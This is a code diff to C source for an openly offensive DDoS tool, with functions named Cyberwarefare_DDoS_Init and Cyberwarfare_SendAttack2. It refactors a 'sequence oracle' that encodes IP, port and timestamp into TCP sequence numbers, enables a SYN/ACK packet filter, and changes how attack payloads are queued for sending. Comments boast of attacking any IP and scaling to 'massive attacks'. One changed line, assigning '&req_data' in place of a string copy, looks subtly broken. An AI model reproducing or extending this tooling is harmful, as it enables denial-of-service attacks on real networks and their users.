@@ -120,16 +120,16 @@ int range = 60000;
 // and it may allow (for groups with enough funding) to implement inline firewalling to block the RST packets
 // which  would allow performing the attack on ANY ip (not just ones you verify against cyberwar_findips)
 typedef struct _seq_oracle {
-    unsigned char a : 4;
-    unsigned char b : 4;
-    unsigned short c : 8;
-    unsigned short d : 8;
-    unsigned short e : 8;
+    unsigned char time_a : 4;
+    unsigned char time_b : 4;
+    unsigned short ip : 8;
+    unsigned short port : 8;
+    unsigned short chk : 8;
 } SequenceOracle;
 
 typedef union {
-    SequenceOracle a;
-    uint32_t b;
+    SequenceOracle bits;
+    uint32_t full;
 } Oracle;
 
 
@@ -140,10 +140,10 @@ int packet_filter(uint32_t seq, uint32_t ip, unsigned short port, uint32_t ts, u
     Oracle xyz;
     int i = 0;
 
-    xyz.b = 0;
-    xyz.a.c = ((ip % 1024) & 0x000000ff);
-    xyz.a.d = (port & 0x000000ff);
-    xyz.a.e = ((xyz.a.c + xyz.a.d) & 0x000000ff);
+    xyz.full = 0;
+    xyz.bits.ip = ((ip % 1024) & 0x000000ff);
+    xyz.bits.port = (port & 0x000000ff);
+    xyz.bits.chk = ((xyz.bits.ip + xyz.bits.port) & 0x000000ff);
 
     if (gen)
         ts += 1;
@@ -151,16 +151,16 @@ int packet_filter(uint32_t seq, uint32_t ip, unsigned short port, uint32_t ts, u
         ts -= 1;
 
     for (i =0; i < 5; i++) {
-        xyz.a.a = ((ts + i) / 2) & 0x0000000f;
-        xyz.a.b = ((ts + i) % 2) & 0x0000000f;
+        xyz.bits.time_a = ((ts + i) / 2) & 0x0000000f;
+        xyz.bits.time_b = ((ts + i) % 2) & 0x0000000f;
 
         // this allows us to generate the SEQUENCE for outgoing packets...
         if (gen != NULL) {
-            *gen = xyz.b;
+            *gen = xyz.full;
             return 1;
         }
 
-        if (xyz.b == seq) return 1;
+        if (xyz.full == seq) return 1;
 
     }
 
@@ -347,8 +347,8 @@ int Cyberwarefare_DDoS_Init(AS_context *ctx) {
     // now lets change the filter...
     // lets specify SYN/ACK for filter.. its not in the API yet.. it was added last
     // ill just do it manually like this
-    //flt->flags |= FILTER_PACKET_FLAGS;
-    //flt->packet_flags |= TCP_FLAG_SYN|TCP_FLAG_ACK;
+    flt->flags |= FILTER_PACKET_FLAGS;
+    flt->packet_flags |= TCP_FLAG_SYN|TCP_FLAG_ACK;
 
     // clear other hooks
     ctx->IncomingPacketFunctions = NULL;
@@ -435,9 +435,9 @@ int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
     // besides this has to be redesigned for a router.. etc.. its showing a full example of how it works.
     // for massive attacks. take your  top 3 coders and spend a single day.. it doesnt take long once you have
     // the packet access...
-    bptr->data = strdup(req_data);
+    bptr->data = &req_data;
     bptr->data_size = req_data_size;
-    //bptr->data_` = 1;
+    bptr->data_nofree = 1;
 
     // put in queue for wire
     NetworkQueueInstructions(ctx, bptr, &optr);
